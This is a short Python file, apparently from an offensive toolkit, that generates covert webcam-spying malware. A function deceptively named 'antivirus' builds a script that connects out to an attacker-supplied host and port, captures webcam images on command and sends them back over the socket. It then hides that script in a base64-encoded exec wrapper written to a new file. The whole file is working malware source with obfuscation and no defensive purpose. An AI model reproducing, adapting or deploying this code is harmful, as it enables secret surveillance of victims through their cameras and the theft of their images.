import base64

def antivirus(lport, lhost, filename):
    script = r"""
import socket
import cv2
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('{}', int({})))
while True:
    number = client.recv(1024)
    number = number.decode()
    camera = cv2.VideoCapture(0)
    for i in range(1, int(number) + 1):
            return_value, image = camera.read()
            cv2.imwrite('opencv' + str(i) + '.png', image)
            with open('opencv' + str(i) + '.png', "rb") as send:
                read = send.read()
                client.send(read)
del camera
    """.format(lhost, lport)
    with open(filename, "x") as virus:
        payload_bytes = script.encode('utf-8')
        base64_bytes = base64.b64encode(payload_bytes)
        base64_payload = base64_bytes.decode('utf-8')
        virus.write(r"""
payload = '{}'
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(payload)[0]))
        """.format(base64_payload))
        return "cv2,socket"
